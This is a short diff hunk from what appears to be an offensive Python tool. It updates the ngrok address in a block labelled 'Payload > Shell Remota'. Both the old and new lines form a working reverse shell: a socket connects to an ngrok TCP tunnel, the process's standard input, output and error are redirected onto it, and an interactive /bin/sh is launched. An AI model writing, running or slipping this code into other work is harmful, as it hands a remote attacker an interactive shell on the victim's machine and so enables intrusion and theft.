@@ -64,7 +64,7 @@ while (back == False):
 
         #Payload > Shell Remota
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-        s.connect(("4.tcp.ngrok.io",10624))
+        s.connect(("6.tcp.ngrok.io",11074))
         os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
         subprocess.call(["/bin/sh","-i"])
     
